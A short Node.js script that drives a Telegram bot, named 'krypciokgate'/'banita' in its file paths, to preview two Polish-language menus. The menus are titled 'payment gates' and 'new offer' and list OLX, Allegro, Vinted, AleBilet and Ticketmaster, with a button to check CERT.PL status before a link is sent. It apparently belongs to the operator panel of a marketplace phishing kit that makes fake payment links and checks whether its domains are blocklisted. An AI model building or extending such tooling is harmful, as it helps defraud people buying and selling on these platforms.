const TG=require("/opt/krypciokgate/node_modules/node-telegram-bot-api");
const fs=require("fs");
const TOKEN=(fs.readFileSync("/opt/krypciokgate/banita.env","utf8").match(/^TOKEN=(.+)$/m)||[])[1].trim();
const bot=new TG(TOKEN,{polling:false});
const pe=(id,e)=>`<tg-emoji emoji-id="${id}">${e}</tg-emoji>`;
(async()=>{
 const m=await bot.sendPhoto(8806188013,fs.createReadStream("/opt/krypciokgate/banita.png"),{caption:"probe",parse_mode:"HTML"});
 await bot.editMessageMedia({
  type:"photo", media:"attach://banita.png", parse_mode:"HTML",
  caption:`${pe("5879814368572478751","🏦")} <b>Bramki płatności</b>\n\nWybierz platformę, na której chcesz zarządzać ofertami.\n\n${pe("6030537007350944596","🛡")} Przed wysłaniem linku możesz sprawdzić status CERT.PL.`
 },{
  chat_id:8806188013, message_id:m.message_id,
  reply_markup:{inline_keyboard:[
   [{text:"OLX",icon_custom_emoji_id:"6035162669948867129",callback_data:"a"},{text:"Allegro",icon_custom_emoji_id:"5879814368572478751",callback_data:"b"}],
   [{text:"Vinted",icon_custom_emoji_id:"5938195768832692153",callback_data:"c"},{text:"AleBilet",icon_custom_emoji_id:"6030710030108463274",callback_data:"d"}],
   [{text:"Ticketmaster",icon_custom_emoji_id:"6030722571412967168",callback_data:"e"}],
   [{text:"Sprawdź CERT",icon_custom_emoji_id:"6030537007350944596",callback_data:"f"}],
   [{text:"Menu główne",icon_custom_emoji_id:"5895507195524550741",callback_data:"g"}]
  ]}
 });
 const m2=await bot.sendPhoto(8806188013,fs.createReadStream("/opt/krypciokgate/banita.png"),{caption:"probe",parse_mode:"HTML"});
 await bot.editMessageMedia({
  type:"photo", media:"attach://banita.png", parse_mode:"HTML",
  caption:`${pe("6034969813032374911","📃")} <b>Nowa oferta</b>`
 },{
  chat_id:8806188013, message_id:m2.message_id,
  reply_markup:{inline_keyboard:[
   [{text:"Allegro Lokalnie",icon_custom_emoji_id:"5879814368572478751",callback_data:"a"},{text:"OLX",icon_custom_emoji_id:"6035162669948867129",callback_data:"b"}],
   [{text:"Vinted",icon_custom_emoji_id:"5938195768832692153",callback_data:"c"},{text:"Ticketmaster",icon_custom_emoji_id:"6030722571412967168",callback_data:"d"}],
   [{text:"AleBilet",icon_custom_emoji_id:"6030710030108463274",callback_data:"e"}],
   [{text:"Menu główne",icon_custom_emoji_id:"5895507195524550741",callback_data:"g"}]
  ]}
 });
 console.log("PREVIEW2 OK");
})();
